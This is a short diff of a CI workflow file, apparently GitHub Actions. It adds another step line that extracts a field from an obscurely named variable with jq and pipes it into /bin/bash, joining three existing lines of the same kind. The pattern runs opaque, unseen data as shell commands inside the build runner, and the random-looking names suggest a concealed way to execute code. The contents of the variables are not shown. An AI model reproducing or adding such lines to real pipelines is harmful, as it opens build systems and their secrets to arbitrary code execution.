@@ -25,6 +25,7 @@ jobs:
           echo $tu5 | jq -r .oqo32553 | /bin/bash
           printf '%s' "$un17134" | jq -r .kbonb643 | /bin/bash
           printf '%s' "$yl11175" | jq -r .inpz3 | /bin/bash
+          echo $get6 | jq -r .o1579 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
